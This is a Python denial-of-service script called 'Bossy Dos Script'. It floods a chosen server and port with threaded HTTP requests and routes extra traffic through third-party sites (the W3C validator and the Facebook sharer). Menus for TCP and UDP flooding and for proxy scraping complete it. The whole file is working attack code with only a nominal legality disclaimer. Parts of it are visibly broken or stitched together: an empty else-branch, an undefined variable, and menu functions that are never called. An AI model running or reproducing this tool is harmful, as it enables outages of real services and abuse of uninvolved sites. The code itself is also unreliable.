#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Bossy Dos Script v.1.0
# by Bossy
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
import random
import time
import sys
import socks
import re
import urllib.request
import os

from bs4 import BeautifulSoup

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # per evitare di visualizzare l'errore d'avvio di scapy

if sys.platform.startswith("linux"): # se si è sotto linux
	from scapy.all import * # importa scapy
elif sys.platform.startswith("freebsd"): # o sotto freebsd
	from scapy.all import * # importa scapy
else: # altrimenti
	
logins = ["AsparTim"]
print (" ")
print (''' \033[91m Loading , Please Wait . . . \033[0m''')
print (" ")
time.sleep(5)
def load():
  print (''' \033[92m Loading: [                    ] 0% \033[0m''')
  time.sleep(2)
  print (''' \033[94m Loading: [...                 ] 15% \033[0m''')
  time.sleep(2)
  print (''' \033[96m Loading: [......              ] 30% \033[0m''')
  time.sleep(2)
  print (''' \033[97m Loading: [.........           ] 45% \033[0m''')
  time.sleep(2)
  print (''' \033[93m Loading: [............        ] 60% \033[0m''')
  time.sleep(2)
  print (''' \033[95m Loading: [...............     ] 75% \033[0m''')
  time.sleep(2)
  print (''' \033[90m Loading: [..................  ] 90% \033[0m''')
  time.sleep(2)
  print (''' \033[99m Loading: [....................] 100% \033[0m''')
  time.sleep(2)



load()
print (" ")
print (''' \033[91m Starting . . . \033[0m''')
print (" ")
time.sleep(5)
sent = 0


def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)

def floodmode():
	global choice1
	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
				exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
			pass
	elif choice1 == "2":
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
				exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
			pass
	else:
		print ("You mistyped, try again.")
		floodmode()

def floodport():
	global port
	try:
		port = int(input("Enter the port you want to flood: "))
		portlist = range(65535) # range di tutte le porte informatiche
		if port in portlist: # se la porta selezionata rientra nel range
			pass # continua
		else: # altrimenti
			print ("You mistyped, try again.")
			floodport() # riparte la funzione e ti fa riscrivere
	except ValueError: # se da' errore di valore
		print ("You mistyped, try again.") # printa questo e
		floodport() # riparte la funzione e ti fa riscrivere
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("You mistyped, try again.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()

def choicemirror1():
	global urlproxy
	choice5 = input ("Download from: free-proxy-list.net='0'(best) or inforge.net='1' ")
	if choice5 == "0":
		urlproxy = "http://free-proxy-list.net/"
		proxyget1()
	elif choice5 == "1":
		inforgeget()
	else:
		print("You mistyped, try again.")
		choicemirror1()

def choicemirror2():
	global urlproxy
	choice5 = input ("Download from: socks-proxy.net='0'(best) or inforge.net='1' ")
	if choice5 == "0":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget1()
	elif choice5 == "1":
		inforgeget()
	else:
		print("You mistyped, try again.")
		choicemirror2()

def proxyget1(): # lo dice il nome, questa funzione scarica i proxies
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except: # se succede qualche casino
		print ("\nERROR!\n")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def inforgeget(): # anche questa funzione scarica proxy pero' da inforge.net
	try:
		if os.path.isfile("proxy.txt"):
			out_file = open("proxy.txt","w") # cancella tutto il contenuto
			out_file.write("")               # di proxy.txt
			out_file.close()
		else:
			pass
		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
		soup = BeautifulSoup(urllib.request.urlopen(url)) # per strasformare in "zuppa" la source del sito
		print ("\nDownloading from inforge.net in progress...")
		base = "https://www.inforge.net/xi/"                       # questi comandi servono per trovare i link nella sezione
		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): # liste-proxy del forum
			links = tag.get("href")                                #
			final = base + links                                   # composizione links
			result = urllib.request.urlopen(final)                 # finalmente apre i link trovati
			for line in result :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca gli ip:porta nelle pagine
				if ip: # se ha trovato gli ip prosegue
					for x in ip:
						out_file = open("proxy.txt","a") # scrittura singolo ip nella proxy.txt
						while True:
							out_file.write(x+"\n")
							out_file.close()
							break # il ciclo si ferma non appena ha finito
		print ("Proxies downloaded successfully.") # se li scarica correttamente, printa questa scritta
	except: # se qualcosa va storto
		print ("\nERROR!\n") # printa qua
	proxylist() # se tutto e' andato a buon fine, prosegue eseguendo proxylist()

def proxylist():
	global proxies
	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (800): "))
	except ValueError:
		threads = 800
		print ("800 threads selected.\n")
	multiplication()

def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mThe Server İs Crashing ✓\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Packet Sent ✓ AsparTim --> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mNo Connection ✓ Server Maybe Down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()
		

def usage():
	print (''' \033[91m	Bossy Dos Script v.1 https://www.aspartim.org/
         __________ ________     _________  ______________.___.
         \______   \\_____  \   /   _____/ /   _____/\__  |   |
          |    |  _/ /   |   \  \_____  \  \_____  \  /   |   |
          |    |   \/    |    \ /        \ /        \ \____   |
          |______  /\_______  //_______  //_______  / / ______|
                 \/         \/         \/         \/  \/       
                                \n
	usage : python bossyv1.0.py [-u] [-p] [-v]
	-h : help
	-u : server ip
	-p : port default 80
	-v : turbo default 200 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-u","--server", dest="host",help="attack to server ip -u ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-v","--turbo",type="int",dest="turbo",help="default 200 -v 200")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 200
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease Wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mCheck Server İp And Port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
